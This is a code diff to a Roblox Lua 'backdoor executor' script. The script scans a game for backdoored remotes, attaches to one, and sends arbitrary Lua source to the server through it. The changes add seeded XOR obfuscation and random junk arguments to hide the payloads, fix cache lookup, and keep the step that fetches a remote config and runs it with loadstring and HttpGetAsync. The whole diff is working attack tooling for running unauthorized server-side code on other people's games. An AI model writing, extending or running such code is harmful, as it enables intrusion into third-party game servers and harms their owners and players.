@@ -8,7 +8,6 @@ local starterGui = game:GetService("StarterGui")
 -- variables
 local config
 local execGuiAPI
-local remoteRedirectionInitialized = false
 local debugSource = [[local function main() %s end;local a=table.create(512)local b=function(...)local c={...}for d,e in pairs(c)do c[d]=tostring(e)or"nil"end;return c end;local f,g;do local h=getfenv(0)h.print,h.warn=function(...)table.insert(a,{0,workspace:GetServerTimeNow(),b(...)})end,function(...)table.insert(a,{1,workspace:GetServerTimeNow(),b(...)})end;f,g=pcall(setfenv(main,h))end;local i=Instance.new("BoolValue")i.Name,i.Value,i.Parent="%s",f,game:GetService("InsertService")i:SetAttribute("stderr",not f and g or nil)i:SetAttribute("stdout",#a>0 and game:GetService("HttpService"):JSONEncode(a)or nil)task.delay(60,i.Destroy,i)]]
 local sourcePayload = [[local a,b,c,d=game:GetService("LogService"),game.SetAttribute,task.delay,"%s";b(a,d,"%s");c(5,b,a,d,nil)]]
 local stringList = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890!@#$%^&*()_+{}:"
@@ -17,18 +16,25 @@ local remoteInfo = {
 	["instance"] = nil,
 	["args"] = {"source"},
 	["argSrcIndex"] = 1,
-	["srcFunc"] = nil
+	["srcFunc"] = nil,
+	["redirection"] = {
+		["initialized"] = false,
+		["encryptionSeed"] = Random.new(workspace:GetServerTimeNow()):NextInteger(0, 0xffffffff)
+	}
 }
 local msgOutputs = {
-	["outdatedCache"] = "Failed to load the backdoor cache of [%s], it might be outdated.",
-	["outdatedConfig"] = "backdoor-executor.lua configuration is outdated! \nIt is recommended to update the configuration to prevent errors.",
-	["noBackdoorRemote"] = "No backdoored remote(s) can be found here!",
-	["configCantLoad"] = "Local configuration cannot be loaded, it might be corrupted.",
 	["attached"] = "\n Attached Remote: %s\n Type: %s",
-	["scanBenchmark"] = "Took %.2f second(s) to scan remotes.",
-	["failedRemoteRedirection"] = "Remote redirection failed to load, using original remote.",
+	["cacheLoaded"] = "Place cache of [%s] has been loaded.",
 	["printRemote"] = "\n Remote: %s | [%s]\n Type: %s",
-	["mainTabText"] = "--[[\n\tbackdoor-executor.lua loaded!\n\tUsing 'github.com/jLn0n/executor-gui' for interface.\n\tDocumentation: github.com/jLn0n/scripts/blob/main/backdoor-executor/README.MD\n--]]\n",
+	["scanBenchmark"] = "Took %.2f second(s) to scan remotes.",
+
+	["cacheFailed"] = "Failed to load the backdoor cache of [%s], it might be outdated.",
+	["outdatedConfig"] = "The configuration file is outdated!\nIt is recommended to update the configuration to prevent errors.",
+	["configLoadFailed"] = "Local configuration failed to load, it might be corrupted.",
+	["noBackdoorRemote"] = "No backdoored remote(s) can be found here!",
+	["remoteRedirectLoadFailed"] = "Remote redirection failed to load, using original remote.",
+
+	["mainTabText"] = "--[[\n\tjLn0n's backdoor executor loaded!\n\tUsing 'github.com/jLn0n/executor-gui' for interface.\n\tDocumentation: github.com/jLn0n/scripts/blob/main/backdoor-executor/README.MD\n--]]\n",
 }
 local stringifiedTypes = {
 	EnumItem = function(value)
@@ -119,7 +125,7 @@ local function pathToInstance(strPath)
 	for index, pathName in subPaths do
 		if not result then return end
 		result = (
-			if index == 1 then
+			if index == 1 and game:FindService(pathName) then
 				game:GetService(pathName)
 			else
 				result:WaitForChild(pathName, 1)
@@ -230,15 +236,21 @@ local function getRemoteFunc(remoteObj)
 end
 
 local applyRedirectedRemoteSecurity do
+	local encryptionRandom = Random.new(remoteInfo.redirection.encryptionSeed)
+
 	-- simple XOR encryption algorithm, nothing special
 	local function XORSource(source: string, key: number): string
 		local randomObj = Random.new(key)
 		local result = ""
+		local randX, randY, randZ =
+			encryptionRandom:NextInteger(0, 192),
+			encryptionRandom:NextInteger(0, 48),
+			encryptionRandom:NextInteger(0, 24)
 
 		for idx = 1, #source do
 			local charByte = string.byte(source, idx, idx)
-			local offset = ((idx % randomObj:NextInteger(0, 128)) + randomObj:NextInteger(0, 32))
-			charByte = bit32.bxor(offset, charByte, randomObj:NextInteger(0, 16))
+			local offset = ((idx % randomObj:NextInteger(0, randX)) + randomObj:NextInteger(0, randY))
+			charByte = bit32.bxor(offset, charByte, randomObj:NextInteger(0, randZ))
 
 			result ..= string.char(charByte)
 		end
@@ -249,12 +261,13 @@ local applyRedirectedRemoteSecurity do
 	function applyRedirectedRemoteSecurity(source)
 		if not config.redirectRemote then return end
 		local argsLenght = math.random(12, 32)
+		local nonceOffset = encryptionRandom:NextInteger(8, argsLenght)
 		local generatedArgs = table.create(argsLenght)
 		local srcArgIdx = math.random(2, (argsLenght - 1))
 		local verificationIdx = notSameRandNumber(8, (argsLenght - 2), srcArgIdx)
 		local randIdx = notSameRandNumber(2, (argsLenght - 3), srcArgIdx, verificationIdx)
 		local nonceIdx = notSameRandNumber(2, (argsLenght - 3), srcArgIdx, verificationIdx, randIdx)
-		local XORKey = math.ceil((((argsLenght / randIdx) % verificationIdx) * nonceIdx) * (verificationIdx * srcArgIdx))
+		local XORKey = math.ceil(((((argsLenght / randIdx) % verificationIdx) * nonceIdx) * (verificationIdx * srcArgIdx)) * nonceOffset)
 
 		generatedArgs[1] = (
 			if (math.random(1, 2) == 2) then
@@ -264,15 +277,22 @@ local applyRedirectedRemoteSecurity do
 		generatedArgs[verificationIdx] = true -- sets a boolean at idx `verificationIdx`
 		generatedArgs[srcArgIdx] = crypt.base64encode(XORSource(source, XORKey))
 		generatedArgs[randIdx] = srcArgIdx -- sets the value `srcArgIdx` to `randIdx`
-		generatedArgs[nonceIdx] = `\127@{generateRandString(randIdx + argsLenght)}` -- generates a nonce that is the lenght of `randIdx`
+		generatedArgs[nonceIdx] = `\127@{generateRandString(randIdx + nonceOffset)}` -- generates a nonce that is the lenght of `randIdx`
 
 		for argIndex = 2, argsLenght do -- inserts random jibberish
 			if typeof(generatedArgs[argIndex]) ~= "nil" then continue end
-			local useString = math.random(1, 2) == 2
+			local valueType = math.random(1, 3)
 
-			generatedArgs[argIndex] = (if useString then generateRandString(math.random(12, 48)) else math.random(1, 255))
+			generatedArgs[argIndex] = (
+				if valueType == 1 then
+					generateRandString(math.random(12, 72))
+				elseif valueType == 2 then
+					math.random(0, 0x7fff)
+				elseif valueType == 3 then
+					math.random(1, 10) > 5
+				else nil
+			)
 		end
-
 		return generatedArgs
 	end
 end
@@ -319,10 +339,10 @@ local function execScript(source, noRedirectOutput)
 		task.delay(60, connection.Disconnect, connection)
 	end
 
-	source = (if remoteInfo.srcFunc then remoteInfo.srcFunc(source) else source)
-	if (config.redirectRemote and remoteRedirectionInitialized) then
+	if (config.redirectRemote and remoteInfo.redirection.initialized) then
 		remoteArgs = applyRedirectedRemoteSecurity(source)
 	else
+		source = (if remoteInfo.srcFunc then remoteInfo.srcFunc(source) else source)
 		remoteArgs[remoteInfo.argSrcIndex] = source
 	end
 	task.spawn(remoteFunc, remoteInfo.instance, unpack(remoteArgs))
@@ -338,22 +358,22 @@ local function initializeRemoteInfo(params, overwriteRemoteInfo)
 end
 
 local function initRemoteRedirection()
-	if not (remoteInfo.foundBackdoor and (config.redirectRemote and not remoteRedirectionInitialized)) then return false end
+	if not (remoteInfo.foundBackdoor and (config.redirectRemote and not remoteInfo.redirection.initialized)) then return false end
 	local nonce = generateRandString(32, true)
 
-	execScript(`require(11906423264)("{nonce}", %userid%)`, true) -- if you wanna try out new features, put 11906414795 as the requireId
+	execScript(`require(11906423264)("{nonce}", "{remoteInfo.redirection.encryptionSeed}", %userid%)`, true) -- if you wanna try out new features, put 11906414795 as the requireId
 	-- we need to improvise until :WaitForAttribute is added
 	waitUntil(5, function() return insertService:GetAttribute(nonce) end)
 	local redirectedRemotePath = insertService:GetAttribute(nonce)
 
-	if not redirectedRemotePath then return warn(msgOutputs.failedRemoteRedirection) end
+	if not redirectedRemotePath then return warn(msgOutputs.remoteRedirectLoadFailed) end
 	local redirectedRemote = pathToInstance(redirectedRemotePath)
 
 	if redirectedRemote and
 		redirectedRemote:IsA("RemoteEvent") and
 		redirectedRemote:GetAttribute("isNonced")
 	then
-		remoteRedirectionInitialized = true
+		remoteInfo.redirection.initialized = true
 
 		initializeRemoteInfo({
 			["instance"] = redirectedRemote,
@@ -375,7 +395,7 @@ local function initRemoteRedirection()
 		end)
 		return true
 	else
-		warn(msgOutputs.failedRemoteRedirection)
+		warn(msgOutputs.remoteRedirectLoadFailed)
 		return false
 	end
 end
@@ -464,11 +484,11 @@ do -- config initialization
 		else
 			game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/scripts/main/backdoor-executor/bexe-config.lua")
 	)
-	local succ, loadedConfig do
-		succ, loadedConfig = pcall(loadstring(rawConfigFile))
+	local loadSuccess, loadedConfig do
+		loadSuccess, loadedConfig = pcall(loadstring(rawConfigFile))
 
-		if (not succ) then
-			warn(msgOutputs.configCantLoad)
+		if (not loadSuccess) then
+			warn(msgOutputs.configLoadFailed)
 			rawConfigFile = game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/scripts/main/backdoor-executor/bexe-config.lua")
 
 			loadedConfig = loadstring(rawConfigFile)()
@@ -491,7 +511,7 @@ do -- backdoor finding
 
 		if placeCacheData then
 			local successCount = 0
-			local remoteObj = (if typeof(placeCacheData.Remote) == "string" then pathToInstance(placeCacheData.Path) else placeCacheData.Path)
+			local remoteObj = (if typeof(placeCacheData.Remote) == "string" then pathToInstance(placeCacheData.Remote) else placeCacheData.Remote)
 			local argSrcIndex = (if typeof(placeCacheData.Args) == "table" then table.find(placeCacheData.Args, "source") else nil)
 
 			successCount += (if typeof(remoteObj) == "Instance" then 1 else 0)
@@ -499,6 +519,7 @@ do -- backdoor finding
 			successCount += (if argSrcIndex then 1 else 0)
 
 			if successCount >= 3 then
+				sendNotification(string.format(msgOutputs.cacheLoaded, game.PlaceId))
 				onAttached({
 					["instance"] = remoteObj,
 					["srcFunc"] = placeCacheData.SourceFunc,
@@ -506,10 +527,9 @@ do -- backdoor finding
 					["argSrcIndex"] = argSrcIndex
 				})
 			else
-				warn(string.format(msgOutputs.outdatedCache, game.PlaceId))
+				warn(string.format(msgOutputs.cacheFailed, game.PlaceId))
 			end
-		end
-		if not remoteInfo.foundBackdoor then
+		else
 			local startTime = os.clock()
 
 			sendNotification("Press F9 to see the remotes being scanned.")
